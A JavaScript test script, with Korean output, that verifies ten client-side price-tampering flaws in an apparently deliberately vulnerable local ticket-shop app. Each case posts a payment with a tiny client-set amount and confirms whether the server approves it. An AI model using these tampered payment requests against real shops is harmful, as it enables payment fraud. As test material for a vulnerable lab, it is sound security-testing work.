const testVuln = async (num, secId, name, flowUrl, flowMethod, flowBody, paymentBody) => {
  let flowResText = '';
  if (flowUrl) {
    const opts = { method: flowMethod || 'GET', headers: { 'Content-Type': 'application/json' } };
    if (flowBody) opts.body = JSON.stringify(flowBody);
    const r = await fetch(flowUrl, opts);
    flowResText = 'Flow status: ' + r.status;
  }

  const payOpts = {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(paymentBody)
  };
  const payRes = await fetch('http://localhost:9928/api/payment', payOpts);
  const payJson = await payRes.json();

  const isVulnerable = payRes.status === 200 && payJson.approvedAmount !== payJson.serverCalculatedSubtotal;

  console.log(`[Bug ${num} | ${secId}] ${name}`);
  console.log(`  - 기능 호출 API: ${flowUrl}`);
  console.log(`  - 정상 정가(서버 계산): ${payJson.serverCalculatedSubtotal.toLocaleString()}원`);
  console.log(`  - 클라이언트 변조 결제액: ${payJson.approvedAmount.toLocaleString()}원`);
  console.log(`  - 검증 결과: ${isVulnerable ? '✅ 취약점 확인됨 (서버가 변조 금액을 그대로 승인)' : '❌ 미탐지'}`);
  console.log('--------------------------------------------------');
};

async function testAll() {
  console.log('==================================================');
  console.log('   site029 Price Tampering 10개 취약점 검증 결과');
  console.log('==================================================\n');

  await testVuln('01', 'SEC-301', '검색창 흐름 금액 변조', 'http://localhost:9928/api/search?keyword=ECLIPSE', 'GET', null, {
    performanceId: 'perf_01',
    actualSubtotal: 374000,
    paymentAmount: 1000,
    quantity: 2
  });

  await testVuln('02', 'SEC-302', '프로필 소개 흐름 금액 변조', 'http://localhost:9928/api/profile', 'POST', { bio: '록 매니아' }, {
    performanceId: 'perf_02',
    actualSubtotal: 380000,
    paymentAmount: 5000,
    quantity: 2
  });

  await testVuln('03', 'SEC-303', '문의 폼 흐름 금액 변조', 'http://localhost:9928/api/support', 'POST', { title: '좌석 문의' }, {
    performanceId: 'perf_03',
    actualSubtotal: 440000,
    paymentAmount: 100,
    quantity: 2
  });

  await testVuln('04', 'SEC-304', '좌석 선택 흐름 금액 변조', 'http://localhost:9928/api/seats/select', 'POST', { performanceId: 'perf_01', seatGrade: 'VIP', quantity: 2 }, {
    performanceId: 'perf_01',
    seatGrade: 'VIP',
    actualSubtotal: 374000,
    paymentAmount: 2500,
    quantity: 2
  });

  await testVuln('05', 'SEC-305', '장바구니 수량 변경 흐름 금액 변조', 'http://localhost:9928/api/cart', 'POST', { performanceId: 'perf_01', seatGrade: 'VIP', quantity: 4 }, {
    performanceId: 'perf_01',
    actualSubtotal: 748000,
    paymentAmount: 990,
    quantity: 4
  });

  await testVuln('06', 'SEC-306', '쿠폰 할인 적용 흐름 금액 변조', 'http://localhost:9928/api/coupons/apply', 'POST', { code: 'STAR2026', targetSubtotal: 374000 }, {
    performanceId: 'perf_01',
    actualSubtotal: 354000,
    paymentAmount: 777,
    couponCode: 'STAR2026'
  });

  await testVuln('07', 'SEC-307', '좌석 등급 조회 흐름 금액 변조', 'http://localhost:9928/api/performances/perf_01/seats', 'GET', null, {
    performanceId: 'perf_01',
    seatGrade: 'VIP',
    actualSubtotal: 187000,
    paymentAmount: 1200,
    quantity: 1
  });

  await testVuln('08', 'SEC-308', '패키지 티켓 흐름 금액 변조', 'http://localhost:9928/api/packages', 'GET', null, {
    performanceId: 'perf_01',
    actualSubtotal: 323000,
    paymentAmount: 3000,
    quantity: 2
  });

  await testVuln('09', 'SEC-309', '주문 요약 흐름 금액 변조', 'http://localhost:9928/api/orders/summary?performanceId=perf_01&seatGrade=VIP&quantity=2', 'GET', null, {
    performanceId: 'perf_01',
    actualSubtotal: 378000,
    paymentAmount: 500,
    quantity: 2
  });

  await testVuln('10', 'SEC-310', '결제 확인 단계 금액 변조', 'http://localhost:9928/api/payment/confirm', 'POST', { orderId: 'ORD-1', paymentAmount: 1000, actualSubtotal: 374000 }, {
    performanceId: 'perf_01',
    actualSubtotal: 374000,
    paymentAmount: 1000,
    quantity: 2
  });
}

testAll();
